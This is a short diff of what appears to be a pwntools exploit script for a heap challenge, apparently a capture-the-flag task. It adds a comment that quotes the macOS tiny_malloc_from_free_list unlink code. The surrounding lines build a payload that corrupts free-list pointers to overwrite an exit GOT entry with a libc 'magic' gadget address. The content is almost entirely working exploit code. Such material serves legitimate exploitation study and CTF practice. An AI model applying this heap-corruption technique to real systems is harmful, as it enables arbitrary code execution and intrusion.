@@ -82,6 +82,15 @@ add(1,2,0x28,"dada")
 ___exit_got = libcdata + 0xb0
 magic = libc+0x25D94
 
+#
+# Note :
+#   tiny_malloc_from_free_list(..)
+#               ...
+# 		next = free_list_unchecksum_ptr(rack, &ptr->next);
+#		if (next) {
+#			next->previous = ptr->previous;
+#               ...
+
 update(1,1,2,0x40,"a"*0x28 + p64(2) + p64(magic) + p64(___exit_got>>4)[:7])
 r.recvuntil("Choice:")
 r.sendline("1")
